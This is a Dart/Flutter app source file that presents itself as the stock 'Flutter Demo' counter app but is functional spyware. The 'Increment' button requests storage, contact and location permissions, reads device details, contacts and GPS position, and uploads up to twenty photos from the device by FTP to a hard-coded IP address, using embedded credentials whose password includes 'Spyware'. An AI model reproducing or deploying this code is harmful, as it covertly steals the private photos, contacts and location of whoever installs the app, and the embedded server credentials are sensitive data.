import 'dart:io';
import 'package:geolocator/geolocator.dart';
import 'package:device_info/device_info.dart';
import 'package:flutter/material.dart';
import 'package:ftpconnect/ftpConnect.dart';
// ignore: import_of_legacy_library_into_null_safe
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  int _counter = 0;

  // Demande de permission
  void _incrementCounter() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.storage,
      Permission.contacts,
      Permission.location,
    ].request();

// Préparation de la connexion FTP
    FTPConnect ftpConnect = FTPConnect('141.94.77.172',
        user: 'utilisateursftp', pass: 'Sftp59?Spyware!');

    // ***** PARTIE INFORMATIONS TELEPHONE *****
    if (Platform.isAndroid) {
      var androidInfo = await DeviceInfoPlugin().androidInfo;
      var release = androidInfo.version.release;
      var manufacturer = androidInfo.manufacturer;
      var host = androidInfo.host;
      print('Android $release, $manufacturer, $host');
    }

    // ***** PARTIE CONTACTS *****

    // Récupérer l'ensemble des contacts dans une liste
    List<Contact> contacts = await ContactsService.getContacts();
    for (var contact in contacts) {
      print(contact.displayName);
      print(contact.phones!.first.value);
    }

    // ***** PARTIE SMS *****

    // ***** PARTIE LOCALISATION *****
    print(await Geolocator.getCurrentPosition());

    // ***** PARTIE PHOTOS *****

    // Récupération de la liste de fichier
    Directory dir = Directory('/storage/18EF-151E/images');
    List<FileSystemEntity> files = dir.listSync(recursive: true);

    // Définition de la liste de fichier
    var listFile = [];

    // Ajout des fichiers dans la liste
    for (FileSystemEntity file in files) {
      var path = file.path;
      listFile.add(path);
    }
    //print(listFile);

    int compteur = 0;
    for (var file in listFile) {
      if (compteur < 20) {
        File fileToUpload = File(file);
        // Lancement de la connexion FTP
        await ftpConnect.connect();
        // Changement de répertoire
        await ftpConnect.changeDirectory('photos');
        // Envoie du fichier sur le serveur
        bool res = await ftpConnect.uploadFile(fileToUpload);
        // Fermeture de la connexion FTP
        await ftpConnect.disconnect();
        compteur++;
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            const Text(
              'You have pushed the button this many times:',
            ),
            Text(
              '$_counter',
              style: Theme.of(context).textTheme.headline4,
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: _incrementCounter,
        tooltip: 'Increment',
        child: const Icon(Icons.add),
      ), // This trailing comma makes auto-formatting nicer for build methods.
    );
  }
}
